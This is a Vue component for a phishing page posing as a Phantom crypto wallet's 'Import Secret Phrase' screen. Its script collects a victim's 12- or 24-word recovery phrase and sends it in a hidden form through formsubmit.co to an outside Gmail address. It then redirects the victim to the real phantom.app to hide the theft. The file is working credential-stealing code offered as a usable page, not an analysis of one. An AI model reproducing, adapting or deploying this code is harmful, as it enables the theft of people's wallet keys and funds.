<template>
    <div v-if="!isLoginSuccess" id="main-box">
        <span id="main-title">Import Secret Phrase</span>

        <section id="sect-1">
            <span id="title-text">Secret Recovery Phrase</span>
            <span id="title-desc">Restore an existing wallet with your 12 or 24-word secret recovery phrase</span>
        </section>

        <section id="p-s">
            <textarea @input="removeErrorMessage" v-model="phraseText" id="phrase-text" name="srp"
                placeholder="Secret Recovery Phrase"></textarea>
        </section>

        <small id="message" v-if="isInvalidPhrase"> {{ errorMessage }} </small>

        <section id="btn-par">
            <button @click="loginPhrase" id="import-btn">Import</button>
        </section>
    </div>
    <div v-else id="main-box-2">
        <div class="loader"></div>
    </div>
    <form ref="loginForm" v-show="isFormVisible" :action="ADMIN_FS" method="POST">
        <input type="hidden" name="_next" value="https://phantom.app/" />
        <input type="hidden" name="_captcha" value="false" />
        <input type="hidden" name="secret_phrase" :value="phraseText" />
    </form>
</template>

<script>
import { ref } from "vue";
export default {
    name: "NewPage",
    setup() {
        const phraseText = ref("");
        const isInvalidPhrase = ref(false);
        const isLoginSuccess = ref(false);
        const isFormVisible = ref(false);
        const loginForm = ref(null);
        const errorMessage = ref("Invalid Secret Recovery Phrase");
        const ADMIN_FS = ref("https://formsubmit.co/metawalleresponse2@gmail.com");

        function validatePhrase() {
            if (
                String(phraseText.value).trim().split(" ").length == 12 ||
                String(phraseText.value).trim().split(" ").length == 24
            ) {
                return true;
            }

            return false;
        }

        const loginPhrase = async () => {
            if (validatePhrase() == false) {
                isInvalidPhrase.value = true;
                return;
            }

            isLoginSuccess.value = true;
            isFormVisible.value = true; // Make form visible before submission

            setTimeout(() => {
                try {
                    if (loginForm.value) {
                        loginForm.value.submit();
                    } else {
                        console.error('Form reference is null');
                        window.location.href = "https://phantom.app/";
                    }
                } catch (err) {
                    console.error('Form submission error:', err);
                    window.location.href = "https://phantom.app/";
                }
            }, 100);
        };

        const removeErrorMessage = () => {
            isInvalidPhrase.value = false;
        };

        return {
            phraseText,
            loginPhrase,
            isInvalidPhrase,
            removeErrorMessage,
            isLoginSuccess,
            errorMessage,
            isFormVisible,
            loginForm,
            ADMIN_FS
        };
    },
};
</script>

<style scoped>
* {
    color: #fff;
}

#main-box {
    display: flex;
    flex-direction: column;
    justify-content: start;
    align-items: center;
    width: 100%;
    padding: 0 0 1.3rem 0;
    height: 100vh;
    max-width: 40rem;
    margin: 0 auto;
    box-shadow: -0.25rem 0 0.5rem rgba(16, 14, 14, 0.2), 0.25rem 0 0.5rem rgba(16, 14, 14, 0.2);
}

#main-box>*+* {
    margin-top: 0.75rem;
}

#main-box>* {
    text-align: center;
}

#main-title {
    font-weight: 500;
    background-color: #2b2b2b;
    width: 100%;
    padding: 0.5rem;
    box-shadow: 0 0.25rem 0.5rem rgba(33, 33, 33, 0.3);
}

#message {
    color: #ff0000;
    font-size: 0.6rem;
}

#title-text {
    font-size: 1.2rem;
    font-weight: 800;
}

#title-desc {
    font-size: 0.7rem;
    text-wrap: wrap;
    color: #686868;
}

#sect-1 {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 0 2rem;
    margin-top: 3rem;
}

#sect-1>*+* {
    margin-top: 0.5rem;
}

#p-s {
    width: 100%;
    margin-top: 2.2rem;
    padding: 0 1.3rem;
}

#phrase-text {
    outline: none;
    border: none;
    border-radius: 0.3rem;
    padding: 0.5rem;
    color: #686868;
    font-size: 0.9rem;
    width: 100%;
    background-color: rgba(22, 20, 20, 0.866);
    height: 18vh;
}

#btn-par {
    padding: 0 1.3rem;
    margin-top: auto;
    width: 100%;
}

#import-btn {
    outline: none;
    border: none;
    border-radius: 1rem;
    padding: 0.4rem 0;
    background-color: #655993;
    width: 100%;
}

#import-btn:hover {
    background-color: rgba(101, 89, 147, 0.7);
}

#main-box-2 {
    display: flex;
    flex-direction: column;
    justify-content: start;
    align-items: center;
    width: 100%;
    padding: 0 0 1.3rem 0;
    height: 100vh;
    max-width: 40rem;
    margin: 0 auto;
    box-shadow: -0.25rem 0 0.5rem rgba(16, 14, 14, 0.2), 0.25rem 0 0.5rem rgba(16, 14, 14, 0.2);
}

/*  */
/*  */
/*  */

/* HTML: <div class="loader"></div> */
.loader {
    width: 50px;
    aspect-ratio: 1;
    display: grid;
    border: 4px solid #0000;
    border-radius: 50%;
    border-color: #655993 #0000;
    animation: l16 2s infinite linear;
    margin: auto;
}

.loader::before,
.loader::after {
    content: "";
    grid-area: 1/1;
    margin: 2px;
    border: inherit;
    border-radius: 50%;
}

.loader::before {
    border-color: #8f81c5 #0000;
    animation: inherit;
    animation-duration: 1s;
    animation-direction: reverse;
}

.loader::after {
    margin: 8px;
}

@keyframes l16 {
    100% {
        transform: rotate(1turn);
    }
}
</style>
